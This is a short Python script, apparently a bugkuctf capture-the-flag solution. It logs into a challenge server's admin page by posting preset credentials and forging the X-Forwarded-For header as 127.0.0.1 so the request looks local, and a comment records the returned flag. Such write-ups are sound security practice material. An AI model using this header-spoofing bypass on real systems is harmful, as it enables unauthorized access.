'''
  利用requests发送post请求，并定制请求头为本地发出的请求
  理论：https://2.python-requests.org//en/latest/user/quickstart/#custom-headers
  题目：bugkuctf 管理员系统
'''
import requests

url = "http://123.206.31.85:1003/"
payload = {'user': 'admin', 'pass': 'test123'}
headers = {'X-Forwarded-For': '127.0.0.1'}
r = requests.post(url, data=payload, headers=headers)
print(r.text)

# <font style="color:#FF0000"><h3>The flag is: 85ff2ee4171396724bae20c0bd851f6b</h3><br\></font\>
